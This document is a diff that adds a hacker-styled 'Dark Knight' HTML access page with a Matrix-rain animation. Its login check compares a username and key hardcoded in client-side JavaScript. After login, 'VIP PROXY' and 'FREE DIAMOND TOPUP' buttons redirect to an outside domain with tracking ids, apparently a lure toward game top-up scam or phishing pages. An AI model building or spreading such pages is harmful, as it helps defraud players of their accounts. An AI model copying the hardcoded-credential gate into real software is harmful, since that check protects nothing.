@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dark Knight | Access</title>
+    <style>
+        /* Basic Settings */
+        body {
+            background-color: black;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            margin: 0;
+            overflow-x: hidden;
+        }
+
+        /* Matrix Canvas */
+        canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+
+        /* Main Container */
+        .container {
+            position: relative;
+            padding: 20px;
+            max-width: 80%;
+            width: 300px;
+            margin: 100px auto;
+            background: rgba(0, 0, 0, 0.7);
+            border: 2px solid #00ff00;
+            box-shadow: 0px 0px 15px #00ff00;
+            border-radius: 10px;
+            z-index: 2;
+        }
+
+        /* Input Fields */
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 2px solid #00ff00;
+            background: black;
+            color: #00ff00;
+            font-size: 1em;
+            border-radius: 5px;
+            text-align: center;
+        }
+
+        /* Button */
+        .button {
+            display: inline-block;
+            width: 100%;
+            padding: 10px;
+            border: 2px solid #00ff00;
+            background: black;
+            color: #00ff00;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: 0.3s;
+            margin-top: 10px;
+        }
+
+        .button:hover {
+            background-color: #00ff00;
+            color: black;
+        }
+
+        /* Error Message */
+        .error {
+            color: red;
+            margin-top: 10px;
+            display: none;
+        }
+
+        /* Hidden Options */
+        .options {
+            display: none;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <canvas id="matrix"></canvas>
+    
+    <div class="container" id="loginContainer">
+        <h2>🔒 Access Portal</h2>
+        <form id="accessForm">
+            <input type="text" id="username" placeholder="Enter Username" required>
+            <input type="password" id="key" placeholder="Enter Key" required>
+            <button type="submit" class="button">Continue</button>
+        </form>
+        <p class="error" id="errorMsg">❌ Invalid Username or Key!</p>
+    </div>
+
+    <!-- Options after successful login -->
+    <div class="container options" id="optionsContainer">
+        <h2>Select an Option</h2>
+        <button class="button" onclick="window.location.href='http://season-event.com.tr/^*Z/FF1/?id=6800292901'">VIP PROXY</button>
+        <button class="button" onclick="window.location.href='http://season-event.com.tr/^*Z/CODA/?id=6800292901'">FREE DIAMOND TOPUP</button>
+    </div>
+
+    <script>
+        document.getElementById("accessForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            var username = document.getElementById("username").value;
+            var key = document.getElementById("key").value;
+
+            if (username === "DARKxVNIZ" && key === "DARKXVNIZSENSEI") {
+                document.getElementById("loginContainer").style.display = "none";
+                document.getElementById("optionsContainer").style.display = "block";
+            } else {
+                document.getElementById("errorMsg").style.display = "block";
+            }
+        });
+
+        // Matrix Effect
+        var canvas = document.getElementById("matrix");
+        var ctx = canvas.getContext("2d");
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        resizeCanvas();
+        window.addEventListener("resize", resizeCanvas);
+
+        var text = "Dark Knight Team ";
+        var columns = Math.floor(canvas.width / 20);
+        var drops = new Array(columns).fill(1);
+
+        function draw() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.15)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#00ff00";
+            ctx.font = "16px Courier New";
+
+            for (var i = 0; i < drops.length; i++) {
+                var char = text[Math.floor(Math.random() * text.length)];
+                ctx.fillText(char, i * 20, drops[i] * 20);
+                
+                if (drops[i] * 20 > canvas.height && Math.random() > 0.98) 
+                    drops[i] = 0;
+                drops[i]++;
+            }
+        }
+
+        setInterval(draw, 35);
+    </script>
+</body>
+</html>
